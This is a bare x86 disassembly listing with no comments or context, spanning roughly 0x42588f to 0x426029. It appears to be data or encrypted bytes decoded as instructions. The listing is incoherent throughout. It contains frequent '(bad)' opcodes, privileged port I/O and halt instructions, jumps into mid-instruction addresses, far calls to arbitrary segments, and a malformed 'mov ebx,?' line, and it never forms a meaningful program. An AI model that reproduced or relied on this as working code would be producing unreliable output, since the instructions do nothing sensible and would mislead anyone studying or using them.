  42588f:	enter  0xa2cf,0x21
  425893:	xlat   BYTE PTR ds:[ebx]
  425894:	pop    edi
  425895:	lods   al,BYTE PTR ds:[esi]
  425896:	add    eax,0xcc38b257
  42589b:	leave  
  42589c:	and    BYTE PTR [ebx],ah
  42589e:	xchg   edx,eax
  42589f:	call   0x4ecc:0x9d2de2a2
  4258a6:	in     eax,0xf6
  4258a8:	lds    ebp,FWORD PTR [edx+0x54f8c456]
  4258ae:	gs pop ebx
  4258b0:	in     al,0x4b
  4258b2:	dec    edi
  4258b3:	jp     0x42587e
  4258b5:	in     eax,0x35
  4258b7:	shr    DWORD PTR [eax-0x11],cl
  4258ba:	ja     0x4258b8
  4258bc:	loopne 0x4258d3
  4258be:	push   ss
  4258bf:	mov    dl,0x61
  4258c1:	push   0xffffffb9
  4258c3:	xor    al,al
  4258c5:	fiadd  WORD PTR [edx]
  4258c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4258c8:	push   es
  4258c9:	xchg   esi,eax
  4258ca:	sahf   
  4258cb:	stos   BYTE PTR es:[edi],al
  4258cc:	les    ebp,FWORD PTR [edi+0x52]
  4258cf:	mov    di,WORD PTR [esp+edx*4]
  4258d3:	xchg   esi,eax
  4258d4:	mov    bl,0xf
  4258d6:	push   eax
  4258d7:	push   esi
  4258d8:	adc    BYTE PTR [ecx+0x1d],cl
  4258db:	cdq    
  4258dc:	mov    al,dl
  4258de:	xor    eax,0x38798147
  4258e3:	pusha  
  4258e4:	data16 int 0x82
  4258e7:	mov    fs:0x2ce6dbd9,eax
  4258ed:	mov    dh,0x14
  4258ef:	shl    ecx,0x56
  4258f2:	bound  ebx,QWORD PTR [eax]
  4258f4:	sbb    dh,BYTE PTR [edi]
  4258f6:	xchg   esp,eax
  4258f7:	sbb    eax,0x26ecb424
  4258fc:	std    
  4258fd:	cdq    
  4258fe:	pusha  
  4258ff:	xor    esp,DWORD PTR [ebp-0x10]
  425902:	ret    0xab66
  425905:	xchg   edx,eax
  425906:	cdq    
  425907:	dec    esp
  425908:	sahf   
  425909:	sbb    DWORD PTR ds:[ecx-0x497bc561],ebx
  425910:	in     eax,dx
  425911:	hlt    
  425912:	aad    0x1a
  425914:	mov    edx,0x7eef7ad2
  425919:	mov    dh,0x3c
  42591b:	mov    ebp,edx
  42591d:	out    0x7,al
  42591f:	or     DWORD PTR [eax+0x69],ebx
  425922:	cwde   
  425923:	mov    esp,0xd5cd9170
  425928:	inc    edx
  425929:	mov    esi,0x225eab55
  42592e:	mov    dl,0x2d
  425930:	push   es
  425931:	clc    
  425932:	mov    bh,dh
  425934:	pushf  
  425935:	arpl   WORD PTR gs:[edx+0x4073f3df],di
  42593c:	mov    dl,0xa9
  42593e:	popa   
  42593f:	or     al,0x57
  425941:	mov    bh,ch
  425943:	je     0x4258f6
  425945:	xchg   ebp,eax
  425946:	aaa    
  425947:	mov    ecx,0x263d4b72
  42594c:	not    BYTE PTR [ebx+esi*1+0x14]
  425950:	cwde   
  425951:	push   esi
  425952:	or     BYTE PTR [ebx+edi*8-0x5fcdcf2a],dh
  425959:	(bad)  
  42595a:	bound  ebp,QWORD PTR [ecx-0x4e]
  42595d:	jg     0x42597f
  42595f:	jge    0x4259cf
  425961:	add    DWORD PTR [edi+ebx*8+0x7f],esi
  425965:	push   esp
  425966:	pusha  
  425967:	or     DWORD PTR [ecx+0x4da73da0],0x6d
  42596e:	hlt    
  42596f:	popf   
  425970:	test   al,0x7c
  425972:	sbb    eax,0xbda83af3
  425977:	(bad)  
  425978:	fwait
  425979:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42597a:	mov    BYTE PTR [esi+0x5e12f7dc],0xca
  425981:	je     0x4259ba
  425983:	cmp    edx,DWORD PTR [edi-0x1f]
  425986:	xchg   esi,eax
  425987:	arpl   bx,dx
  425989:	(bad)  
  42598b:	cmp    ch,dl
  42598d:	cmp    al,0x74
  42598f:	gs push 0x42b70276
  425995:	in     al,0xae
  425997:	hlt    
  425998:	pop    esi
  425999:	ret    0xbcfe
  42599c:	and    ebx,0x28098970
  4259a2:	xchg   ecx,eax
  4259a3:	pop    eax
  4259a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4259a5:	mov    ebx,0xf172d2cc
  4259aa:	xor    ah,BYTE PTR [edi+edi*4]
  4259ad:	sbb    edx,ebp
  4259af:	retf   
  4259b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4259b1:	(bad)  
  4259b2:	dec    edx
  4259b3:	adc    eax,DWORD PTR ds:0x8ee2d4ff
  4259b9:	add    DWORD PTR [ecx],0xfa98ab50
  4259bf:	push   esp
  4259c0:	dec    ebp
  4259c1:	mov    bh,0xdb
  4259c3:	mov    al,0x1f
  4259c5:	test   al,0x35
  4259c7:	mov    edi,0x49e1591f
  4259cc:	dec    ebx
  4259cd:	jl     0x425979
  4259cf:	inc    ebx
  4259d0:	scas   eax,DWORD PTR es:[edi]
  4259d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4259d2:	jmp    0x425986
  4259d4:	je     0x4259d3
  4259d6:	subps  xmm1,XMMWORD PTR [ecx+0x1edce4d1]
  4259dd:	stc    
  4259de:	ds mov bl,0x7f
  4259e1:	sbb    al,0xb0
  4259e3:	loop   0x425994
  4259e5:	fist   DWORD PTR [ecx]
  4259e7:	out    dx,al
  4259e8:	pop    edi
  4259e9:	cdq    
  4259ea:	or     DWORD PTR [ecx+0x4a],ebp
  4259ed:	add    BYTE PTR [ecx],0xf9
  4259f0:	ror    BYTE PTR [esi+0x5a],cl
  4259f3:	fs jo  0x4259fe
  4259f6:	xchg   edx,eax
  4259f7:	in     al,0x92
  4259f9:	push   0xb2edf276
  4259fe:	xlat   BYTE PTR ds:[ebx]
  4259ff:	mov    eax,0xc08d0000
  425a04:	pop    es
  425a05:	aaa    
  425a06:	dec    edi
  425a07:	idiv   DWORD PTR [ebp+0x532a00fa]
  425a0d:	(bad)  [eax-0x1378d24b]
  425a13:	int3   
  425a14:	add    DWORD PTR [eax],eax
  425a16:	add    eax,DWORD PTR es:[eax]
  425a19:	add    BYTE PTR [ebx],al
  425a1b:	dec    ebx
  425a1c:	ror    BYTE PTR [edi-0x32],0x9b
  425a20:	out    0x30,eax
  425a22:	jns    0x4259e1
  425a24:	dec    esi
  425a25:	mov    cl,0xc1
  425a27:	mov    ebp,0x34d6f47e
  425a2c:	and    BYTE PTR [ebp-0x2b],bh
  425a2f:	rol    DWORD PTR [esi],0x3e
  425a32:	push   ecx
  425a33:	sbb    esp,esi
  425a35:	in     al,0x1f
  425a37:	sbb    ebp,DWORD PTR [edi-0x5e665ffd]
  425a3d:	sub    al,0xf0
  425a3f:	retf   0xd519
  425a42:	xchg   ebx,eax
  425a43:	dec    edi
  425a44:	push   cs
  425a45:	enter  0x22d2,0x2a
  425a49:	das    
  425a4a:	or     al,0x76
  425a4c:	out    dx,eax
  425a4d:	jecxz  0x425abb
  425a4f:	aaa    
  425a50:	sbb    ah,dl
  425a52:	push   es
  425a53:	push   0xc9dd0219
  425a58:	mov    ch,0x71
  425a5a:	push   edx
  425a5b:	jmp    0xa545:0x4cbc2812
  425a62:	xchg   ebx,eax
  425a63:	cmp    al,0x6d
  425a65:	or     dl,BYTE PTR [edx+ebx*8]
  425a68:	inc    edx
  425a69:	pop    ebp
  425a6a:	add    eax,0x6bddb8b9
  425a6f:	loopne 0x425a99
  425a71:	mov    ebx,?
  425a73:	mov    al,0x4
  425a75:	pop    es
  425a76:	push   ebp
  425a77:	xor    ch,BYTE PTR [ebx-0x30]
  425a7a:	sbb    al,0x3c
  425a7c:	ds sti 
  425a7e:	inc    esp
  425a7f:	shr    DWORD PTR [esi-0x11248dca],1
  425a85:	(bad)  
  425a86:	mov    al,BYTE PTR ds:0xcbb800f2
  425a8c:	inc    ecx
  425a8d:	dec    esi
  425a8e:	push   ss
  425a8f:	jae    0x425b0c
  425a91:	aad    0xa9
  425a93:	jmp    0x1922af71
  425a98:	popa   
  425a99:	xor    edx,DWORD PTR [ebx+0x3d193d12]
  425a9f:	fcomp  DWORD PTR ds:0x64e5936d
  425aa5:	imul   esp,DWORD PTR [ecx+0x712fb07],0x2
  425aac:	(bad)  
  425aad:	lods   ax,WORD PTR es:[esi]
  425ab0:	and    ch,al
  425ab2:	repz mov edx,0x6d3d47b4
  425ab8:	inc    ebp
  425ab9:	cwde   
  425aba:	cmc    
  425abb:	pushf  
  425abc:	adc    edx,esp
  425abe:	loop   0x425adf
  425ac0:	or     eax,DWORD PTR [ebx-0x5d22db63]
  425ac6:	in     al,dx
  425ac7:	push   edi
  425ac8:	dec    esp
  425ac9:	jmp    0x425a71
  425acb:	shl    DWORD PTR [esi-0x39a389d2],cl
  425ad1:	iret   
  425ad2:	fsubr  DWORD PTR es:[eax-0x57]
  425ad6:	lods   al,BYTE PTR ds:[esi]
  425ad7:	outs   dx,BYTE PTR ds:[esi]
  425ad8:	pop    ebx
  425ad9:	fwait
  425ada:	adc    DWORD PTR [eax-0x43],esp
  425add:	xor    edx,esi
  425adf:	addr16 or al,0x9f
  425ae2:	jne    0x425b3a
  425ae4:	or     BYTE PTR [esp+esi*2-0x9],dh
  425ae8:	(bad)  
  425ae9:	out    dx,al
  425aea:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  425aec:	cmp    DWORD PTR [esi],ebp
  425aee:	xor    edx,DWORD PTR [eax]
  425af0:	add    BYTE PTR [ebx+0x2c],al
  425af3:	dec    edi
  425af4:	mov    ds:0x2d9e1885,eax
  425af9:	ja     0x425aec
  425afb:	mov    eax,0x836c89c2
  425b00:	cmc    
  425b01:	xlat   BYTE PTR ds:[ebx]
  425b02:	or     al,0x86
  425b04:	sub    al,BYTE PTR [ecx-0x3a]
  425b07:	jp     0x425b28
  425b09:	mov    edx,ebx
  425b0b:	or     eax,0x10e0746d
  425b10:	inc    edi
  425b11:	pop    edi
  425b12:	in     eax,dx
  425b13:	nop
  425b14:	dec    esp
  425b15:	ret    0x2009
  425b18:	retf   
  425b19:	add    eax,0x14f494d5
  425b1e:	lods   eax,DWORD PTR ds:[esi]
  425b1f:	sbb    al,0x10
  425b21:	inc    esp
  425b22:	sti    
  425b23:	mov    al,ds:0xb3351745
  425b28:	xchg   DWORD PTR [edi],ecx
  425b2a:	rol    DWORD PTR [ecx],0xa7
  425b2d:	ins    BYTE PTR es:[edi],dx
  425b2e:	sub    eax,0x658be098
  425b33:	sub    eax,DWORD PTR [esi-0x13d13791]
  425b39:	push   cs
  425b3a:	inc    esi
  425b3b:	out    0x32,eax
  425b3d:	sub    dh,BYTE PTR [ebx+0x67af5fa2]
  425b43:	sub    eax,0x3af33b55
  425b48:	repnz nop
  425b4a:	inc    edi
  425b4b:	or     ah,BYTE PTR [eax+0x16]
  425b4e:	xchg   DWORD PTR [eax*2-0x2350394b],edx
  425b55:	in     al,0xac
  425b57:	out    0xc4,al
  425b59:	push   esp
  425b5a:	out    dx,eax
  425b5b:	xor    dh,BYTE PTR [ebx+0x1b22a6e1]
  425b61:	sub    al,BYTE PTR [esi-0x7a]
  425b64:	mov    WORD PTR [eax],fs
  425b66:	inc    edi
  425b67:	int    0xdd
  425b69:	mov    ecx,0x58c6d0d4
  425b6e:	or     al,0x49
  425b70:	and    DWORD PTR [ecx+0x7bb3f82c],0x50
  425b77:	or     edx,DWORD PTR [esi+ebp*4-0x641c130c]
  425b7e:	mov    dh,0x50
  425b80:	scas   eax,DWORD PTR es:[edi]
  425b81:	and    BYTE PTR [ebx+0xa],0x42
  425b85:	retf   
  425b86:	and    eax,0x973f27cd
  425b8b:	cli    
  425b8c:	daa    
  425b8d:	add    al,0xe6
  425b8f:	cli    
  425b90:	repz sub BYTE PTR ss:[eax],0xae
  425b95:	cmp    al,BYTE PTR [ecx+0xa]
  425b98:	cli    
  425b99:	ds inc edi
  425b9b:	pop    ss
  425b9c:	cwde   
  425b9d:	inc    esi
  425b9e:	jne    0x425bef
  425ba0:	fmulp  st(0),st
  425ba2:	pop    ecx
  425ba3:	push   esp
  425ba4:	cmp    edi,eax
  425ba6:	add    al,0x5d
  425ba8:	inc    ebp
  425ba9:	sub    eax,0xfff278f0
  425bae:	mov    edx,0xc96c4aaa
  425bb3:	dec    eax
  425bb4:	(bad)  
  425bb5:	push   esp
  425bb6:	stos   DWORD PTR es:[edi],eax
  425bb7:	imul   ebx,DWORD PTR [ecx],0x1e
  425bba:	inc    ebx
  425bbb:	sahf   
  425bbc:	(bad)  
  425bbd:	sti    
  425bbe:	ror    BYTE PTR [edx],0xc1
  425bc1:	outs   dx,DWORD PTR ds:[esi]
  425bc2:	mul    DWORD PTR [esi*8-0x5cd545e4]
  425bc9:	dec    ebp
  425bca:	sbb    dl,BYTE PTR [edi+0x7ab7ccd8]
  425bd0:	mov    dh,0x41
  425bd2:	xchg   esi,eax
  425bd3:	pop    edx
  425bd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425bd5:	sbb    al,0x22
  425bd7:	push   ss
  425bd8:	push   edx
  425bd9:	fsubr  DWORD PTR [esp+ebp*1-0x3d0ed386]
  425be0:	(bad)  
  425be2:	stos   BYTE PTR es:[edi],al
  425be3:	scas   eax,DWORD PTR es:[edi]
  425be4:	jmp    FWORD PTR [edx-0x48]
  425be7:	test   BYTE PTR [edx-0x19371356],bh
  425bed:	retf   0xad62
  425bf0:	(bad)  
  425bf1:	outs   dx,BYTE PTR ds:[esi]
  425bf2:	test   eax,0xd6069d49
  425bf7:	add    ebx,DWORD PTR [edi]
  425bf9:	xor    al,0xe3
  425bfb:	jle    0x425bc7
  425bfd:	popa   
  425bfe:	fdivr  DWORD PTR [edx+ebx*2-0x4602ad60]
  425c05:	je     0x425c18
  425c07:	mov    esi,0xf5d6649
  425c0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c0d:	mov    ds:0x8bf3370e,eax
  425c12:	test   eax,0xb4dcf7db
  425c17:	jg     0x425c31
  425c19:	xor    esp,DWORD PTR [ebx]
  425c1b:	test   eax,0xcc06de49
  425c20:	xlat   BYTE PTR ds:[ebx]
  425c21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c22:	mov    dl,0x7b
  425c24:	pushf  
  425c25:	sub    al,0x89
  425c27:	inc    ebp
  425c28:	(bad)  
  425c29:	inc    edi
  425c2a:	daa    
  425c2b:	jmp    0x6bf2a704
  425c30:	aam    0xac
  425c32:	xchg   DWORD PTR ds:0xc4581aba,esi
  425c38:	push   esp
  425c39:	adc    al,0x41
  425c3b:	pop    edi
  425c3c:	push   ebp
  425c3d:	mov    al,0xc0
  425c3f:	rcl    BYTE PTR [ecx+eax*4+0x6dca3ddc],cl
  425c46:	push   es
  425c47:	(bad)  
  425c49:	pusha  
  425c4a:	and    esi,DWORD PTR [ecx+ebp*8]
  425c4d:	push   ebp
  425c4e:	lahf   
  425c4f:	xchg   ebx,eax
  425c50:	aaa    
  425c51:	push   eax
  425c52:	push   es
  425c53:	test   al,0x66
  425c55:	xor    BYTE PTR [edi+0x213b828a],bl
  425c5b:	retf   0xe94a
  425c5e:	fiadd  DWORD PTR [ebx+edx*2+0x34bc0566]
  425c65:	pop    esi
  425c66:	jmp    0x13e2:0x234e95ee
  425c6d:	mov    eax,ds:0x303488d5
  425c72:	push   esp
  425c73:	add    DWORD PTR [ebp+0x6551970c],edx
  425c79:	adc    ebx,DWORD PTR [ebp*1+0x51527ef]
  425c80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c81:	stc    
  425c82:	hlt    
  425c83:	push   ss
  425c84:	cld    
  425c85:	and    ch,ch
  425c87:	add    dl,BYTE PTR es:[ebp-0x2dfd9f5f]
  425c8e:	mov    cl,0x5c
  425c90:	mov    dh,0xc6
  425c92:	(bad)
  425c95:	cmp    eax,0x55aed7a5
  425c9a:	pop    ss
  425c9b:	cmp    ecx,0x4f37126d
  425ca1:	scas   al,BYTE PTR es:[edi]
  425ca2:	stc    
  425ca3:	arpl   WORD PTR [ebx+edi*8],ax
  425ca6:	cdq    
  425ca7:	push   ss
  425ca8:	in     eax,dx
  425ca9:	and    ebp,DWORD PTR [ecx-0x5b27ccce]
  425caf:	loope  0x425c9d
  425cb1:	scas   al,BYTE PTR es:[edi]
  425cb2:	stos   BYTE PTR es:[edi],al
  425cb3:	int3   
  425cb4:	sbb    al,0x33
  425cb6:	xchg   edx,eax
  425cb7:	sbb    dh,ah
  425cb9:	lods   al,BYTE PTR ds:[esi]
  425cba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425cbb:	sub    ebp,edx
  425cbd:	out    0xdf,eax
  425cbf:	test   ah,al
  425cc1:	fdiv   DWORD PTR [edx+0x46]
  425cc4:	push   gs
  425cc6:	ins    DWORD PTR es:[edi],dx
  425cc7:	daa    
  425cc8:	push   0x3182f398
  425ccd:	xchg   edi,eax
  425cce:	dec    ebp
  425ccf:	idiv   esi
  425cd1:	pop    ebx
  425cd2:	(bad)  
  425cd3:	xchg   ecx,eax
  425cd4:	int    0x71
  425cd6:	fistp  DWORD PTR [edx+0x1a]
  425cd9:	das    
  425cda:	test   eax,0xef266119
  425cdf:	out    dx,al
  425ce0:	scas   eax,DWORD PTR es:[edi]
  425ce1:	shl    DWORD PTR [eax-0x5b],cl
  425ce4:	xor    ecx,DWORD PTR [esi-0x4c]
  425ce7:	xchg   esp,eax
  425ce8:	mov    ch,0x77
  425cea:	pop    esi
  425ceb:	mov    edi,eax
  425ced:	xchg   edx,eax
  425cee:	aaa    
  425cef:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  425cf1:	retfw  
  425cf3:	adc    ebp,DWORD PTR [edx]
  425cf5:	loop   0x425c83
  425cf7:	mov    ecx,0xbc829e61
  425cfc:	jge    0x425ccb
  425cfe:	xchg   DWORD PTR [eax-0x60],edi
  425d01:	inc    esi
  425d02:	jmp    0xeb74:0xb33eb990
  425d09:	sbb    esi,DWORD PTR [eax]
  425d0b:	xchg   ebp,eax
  425d0c:	pop    ebx
  425d0d:	scas   al,BYTE PTR es:[edi]
  425d0e:	imul   esi,edi,0x828406bd
  425d14:	push   0x6d5f1711
  425d19:	mov    edx,0xe4dd4886
  425d1e:	adc    ah,BYTE PTR [eax-0x4d8c10c]
  425d24:	and    DWORD PTR [edi+0x62a000e5],ebp
  425d2a:	cmp    al,BYTE PTR [ecx*1-0x63462ea1]
  425d31:	cmc    
  425d32:	jg     0x425cc8
  425d34:	pop    ds
  425d35:	dec    edi
  425d36:	add    esi,DWORD PTR [ecx+0x26]
  425d39:	nop
  425d3a:	jmp    0x425d90
  425d3c:	int    0x3d
  425d3e:	popa   
  425d3f:	xor    eax,0x8ab00000
  425d44:	call   0xfa2657ca
  425d49:	mov    ebx,0x99242062
  425d4e:	dec    edx
  425d4f:	sbb    BYTE PTR [ecx],dh
  425d51:	hlt    
  425d52:	adc    dl,al
  425d54:	add    DWORD PTR [eax],eax
  425d56:	add    eax,DWORD PTR es:[eax]
  425d59:	add    BYTE PTR [ebx+edi*1+0x4698045a],al
  425d60:	stos   BYTE PTR es:[edi],al
  425d61:	inc    esp
  425d62:	and    ah,BYTE PTR [edx-0x42]
  425d65:	sbb    al,0xe0
  425d67:	inc    eax
  425d68:	add    dl,BYTE PTR [ebp+0xf]
  425d6b:	dec    edx
  425d6c:	ret    0xfba6
  425d6f:	ficomp WORD PTR [ecx+eiz*1]
  425d72:	(bad)  
  425d73:	push   ebx
  425d74:	hlt    
  425d75:	or     eax,0xb1e7a09a
  425d7a:	add    esp,esp
  425d7c:	aas    
  425d7d:	xchg   edx,eax
  425d7e:	sub    DWORD PTR [ebx+0x1f17e3e3],esp
  425d84:	cmc    
  425d85:	jg     0x425d8d
  425d87:	push   ebx
  425d88:	mov    BYTE PTR [esi+0x23],cl
  425d8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d8c:	mov    ds:0x671e8630,al
  425d91:	neg    ah
  425d93:	pop    ebx
  425d94:	jl     0x425d1c
  425d96:	mov    ah,0xed
  425d98:	rol    DWORD PTR [edi+0x7b3e9e3b],1
  425d9e:	jecxz  0x425d82
  425da0:	dec    esi
  425da1:	and    bh,BYTE PTR [ecx-0x3945f146]
  425da7:	dec    eax
  425da8:	shr    BYTE PTR [ebp+0x2a],cl
  425dab:	repnz mov ebp,0xb4832fd0
  425db1:	xchg   ecx,eax
  425db2:	(bad)  
  425db3:	dec    esi
  425db4:	or     eax,0x7e2f6338
  425db9:	icebp  
  425dba:	cli    
  425dbb:	addr16 mov ah,0x58
  425dbe:	mov    edi,0xa3b5db66
  425dc3:	sub    eax,0x9c0033d2
  425dc8:	enter  0xda60,0xd9
  425dcc:	cwde   
  425dcd:	arpl   WORD PTR [edi+0x35],bp
  425dd0:	sub    ah,cl
  425dd2:	xchg   ebp,eax
  425dd3:	push   ecx
  425dd4:	pop    edx
  425dd5:	rcl    BYTE PTR [edi+ebp*8+0x18c89feb],cl
  425ddc:	sbb    BYTE PTR [ecx],dh
  425dde:	in     eax,dx
  425ddf:	add    eax,0xfe837339
  425de4:	adc    eax,0xf9d1d517
  425de9:	or     BYTE PTR [eax],dl
  425deb:	or     al,0x45
  425ded:	xor    ebx,eax
  425def:	pop    eax
  425df0:	push   ecx
  425df1:	lock mov dl,0x0
  425df4:	adc    dh,BYTE PTR [esi+ecx*2]
  425df7:	les    ebp,FWORD PTR [eax+0x7b715a1d]
  425dfd:	fdivrp st(6),st
  425dff:	mul    cl
  425e01:	cmp    DWORD PTR ds:0xccca55c6,0xb0aaae2e
  425e0b:	xchg   BYTE PTR [esi+0x750540e4],bh
  425e11:	dec    esi
  425e12:	mov    ecx,0xba1ace68
  425e17:	out    0x9d,al
  425e19:	setle  BYTE PTR [esp+edx*8+0x40]
  425e1e:	jb     0x425e01
  425e20:	push   cs
  425e21:	cmp    DWORD PTR [eax+0x12],esp
  425e24:	lds    esi,FWORD PTR [ecx]
  425e26:	popf   
  425e27:	cmp    al,0x10
  425e29:	mov    bh,0x88
  425e2b:	inc    edi
  425e2c:	fstp   QWORD PTR [eax]
  425e2e:	in     eax,dx
  425e2f:	ds dec eax
  425e31:	mov    bh,0xfd
  425e33:	push   edi
  425e34:	or     eax,DWORD PTR [ebx+ecx*8+0x43d1e0bf]
  425e3b:	mov    ds:0xa1425604,al
  425e40:	leave  
  425e41:	add    ebx,DWORD PTR [esi+0x28]
  425e44:	mov    al,ds:0xf66e8105
  425e49:	inc    esp
  425e4a:	mov    bh,0xbf
  425e4c:	aad    0xeb
  425e4e:	mov    ebp,0x18c662c4
  425e53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e54:	rol    esi,1
  425e56:	in     al,0x82
  425e58:	cmp    esp,DWORD PTR [edi]
  425e5a:	jmp    0x425eaa
  425e5c:	push   ecx
  425e5d:	(bad)  
  425e5e:	push   cs
  425e5f:	adc    DWORD PTR [esi],esi
  425e61:	mov    esi,0x889b0ee4
  425e66:	rol    ebx,cl
  425e68:	mov    eax,0x93376203
  425e6d:	add    BYTE PTR [edx+0x6d],0x92
  425e71:	inc    esi
  425e72:	xchg   ecx,eax
  425e73:	jno    0x425e38
  425e75:	add    DWORD PTR [eax-0x67],ebx
  425e78:	out    dx,al
  425e79:	and    eax,0xafbd8ce5
  425e7e:	(bad)  
  425e80:	pop    esp
  425e81:	sti    
  425e82:	push   ebx
  425e83:	rol    ah,cl
  425e85:	jmp    0x5340:0x2c240c9c
  425e8c:	outs   dx,BYTE PTR ds:[esi]
  425e8d:	mov    DWORD PTR [ebx+0x7ae3f704],ebx
  425e93:	les    ecx,FWORD PTR [ebx]
  425e95:	retf   
  425e96:	and    edi,ebp
  425e98:	sbb    al,0x26
  425e9a:	mov    eax,0xb72ff8ae
  425e9f:	dec    edi
  425ea1:	xor    ch,0x17
  425ea4:	xlat   BYTE PTR ds:[ebx]
  425ea5:	imul   eax,eax,0x2c
  425ea8:	cld    
  425ea9:	mov    ds:0x65b149af,al
  425eae:	idiv   BYTE PTR [edi]
  425eb0:	rol    DWORD PTR [esi+0x1b88a788],0xc8
  425eb7:	in     eax,dx
  425eb8:	or     ecx,DWORD PTR [edx-0x65f330ae]
  425ebe:	or     dh,BYTE PTR [ebx+0x4b]
  425ec1:	retf   
  425ec2:	aad    0x54
  425ec4:	std    
  425ec5:	dec    esp
  425ec6:	ja     0x425f1e
  425ec8:	sbb    bl,bh
  425eca:	push   edi
  425ecb:	add    bh,dl
  425ecd:	lods   eax,DWORD PTR ds:[esi]
  425ece:	mov    al,0x8
  425ed0:	xor    BYTE PTR [ecx],cl
  425ed2:	xor    ch,0xa1
  425ed5:	jmp    0x425eda
  425ed7:	push   cs
  425ed8:	inc    edi
  425ed9:	cmp    DWORD PTR [ebp+ebp*2+0x0],ebx
  425edd:	xor    esp,DWORD PTR [ecx]
  425edf:	xchg   BYTE PTR [ecx-0x18],cl
  425ee2:	mov    ecx,0x3b059f8d
  425ee7:	sbb    BYTE PTR [edx+0x1bf29f22],0x5
  425eee:	aam    0xd2
  425ef0:	stc    
  425ef1:	xchg   BYTE PTR [esi-0x38dbfa36],dl
  425ef7:	adc    eax,0xcc6332d8
  425efc:	and    ebx,DWORD PTR [edx+0x78e0b029]
  425f02:	outs   dx,BYTE PTR ds:[esi]
  425f03:	arpl   WORD PTR [edi+0x6e2d4bba],di
  425f09:	xchg   ebp,eax
  425f0a:	push   0xfffffffc
  425f0c:	mov    ds:0x71d25f2,al
  425f11:	inc    edx
  425f12:	aas    
  425f13:	and    eax,0x14be8e36
  425f18:	mov    esp,0xf4921f8b
  425f1d:	dec    ebp
  425f1e:	(bad)  
  425f20:	cmp    eax,0xa96ba065
  425f25:	gs pop ebp
  425f27:	scas   eax,DWORD PTR es:[edi]
  425f28:	fbstp  TBYTE PTR ds:0x38f72cbd
  425f2e:	fsub   QWORD PTR [edx]
  425f30:	push   DWORD PTR [esi+0x28c212ed]
  425f36:	sub    al,0xdc
  425f38:	lahf   
  425f39:	mov    edi,0x864aff72
  425f3e:	sub    BYTE PTR [eax+0x45c2057d],dl
  425f44:	dec    edx
  425f45:	cwde   
  425f46:	push   ebx
  425f47:	stc    
  425f48:	ror    ebp,cl
  425f4a:	cmp    bl,BYTE PTR [edx]
  425f4c:	xchg   ebp,eax
  425f4d:	sahf   
  425f4e:	jns    0x425ef5
  425f50:	push   ds
  425f51:	or     esi,edx
  425f53:	outs   dx,BYTE PTR ds:[esi]
  425f54:	loop   0x425fcd
  425f56:	outs   dx,DWORD PTR ds:[esi]
  425f57:	push   edi
  425f58:	js     0x425f15
  425f5a:	sub    al,0x73
  425f5c:	shr    DWORD PTR [ecx-0x53],1
  425f5f:	neg    BYTE PTR [eax]
  425f61:	push   cs
  425f62:	adc    DWORD PTR [esi-0x19],edi
  425f65:	clc    
  425f66:	mov    ah,0xd3
  425f68:	sbb    eax,0x9073e764
  425f6d:	pop    ecx
  425f6e:	cmp    al,0x39
  425f70:	dec    eax
  425f71:	int3   
  425f72:	xor    BYTE PTR fs:[eax-0x10],ch
  425f76:	xor    al,0x4e
  425f78:	mov    esp,0x52b5ff87
  425f7d:	fbld   TBYTE PTR [ecx+0x78]
  425f80:	mov    BYTE PTR [esi],cl
  425f82:	data16 xor BYTE PTR [ebx+edi*2-0x428c3849],bh
  425f8a:	loopne 0x425f5a
  425f8c:	mov    ecx,0xe17039a4
  425f91:	pop    ecx
  425f92:	adc    esp,DWORD PTR cs:[ebp-0x798e1dbd]
  425f99:	test   eax,0x655dda18
  425f9e:	mov    esp,0x3018379b
  425fa3:	xlat   BYTE PTR ds:[ebx]
  425fa4:	(bad)  
  425fa5:	rcr    BYTE PTR [edx],1
  425fa7:	out    0xd3,al
  425fa9:	or     DWORD PTR [eax+eiz*2],edx
  425fac:	stos   DWORD PTR es:[edi],eax
  425fad:	push   0xffffffdd
  425faf:	adc    eax,0xc8de4480
  425fb4:	push   esi
  425fb5:	cwde   
  425fb6:	icebp  
  425fb7:	icebp  
  425fb8:	loop   0x425f81
  425fba:	push   0x53
  425fbc:	mov    edi,0x8e3e8299
  425fc1:	and    cl,BYTE PTR [ecx]
  425fc3:	aaa    
  425fc4:	addr16 fst st(0)
  425fc7:	add    eax,0xd39bacbe
  425fcc:	loope  0x425f54
  425fce:	push   edx
  425fcf:	xor    BYTE PTR [ebx],al
  425fd1:	mov    eax,ds:0x62516bfc
  425fd6:	xchg   edx,eax
  425fd7:	dec    ebp
  425fd8:	mov    esi,0x4f937d50
  425fdd:	xlat   BYTE PTR ds:[ebx]
  425fde:	div    BYTE PTR [edx]
  425fe0:	loope  0x426005
  425fe2:	xchg   esp,eax
  425fe3:	and    BYTE PTR [ecx-0x27],0xee
  425fe7:	jl     0x425f91
  425fe9:	shl    BYTE PTR [esi+ebx*8+0x1931baee],0x40
  425ff1:	scas   al,BYTE PTR es:[edi]
  425ff2:	add    BYTE PTR [edi+0x9],bl
  425ff5:	sbb    eax,0xc2988a85
  425ffa:	stc    
  425ffb:	mov    ecx,0x25734f8
  426000:	enter  0xd1cf,0x40
  426004:	pop    esp
  426005:	cli    
  426006:	or     DWORD PTR [ebx+0x61],ebp
  426009:	pop    ss
  42600a:	push   ebx
  42600b:	pop    es
  42600c:	mov    al,ds:0xd23ab10d
  426011:	sub    al,0x85
  426013:	sahf   
  426014:	test   al,0x22
  426016:	pop    es
  426017:	enter  0x255a,0xb9
  42601b:	cmp    al,BYTE PTR [esi]
  42601d:	aam    0x34
  42601f:	cld    
  426020:	adc    cl,BYTE PTR [ecx+0x287ce5dc]
  426026:	fcomp  DWORD PTR [esi+0x63]
  426029:	sbb    BYTE PTR ds:0x41a4e733,ah
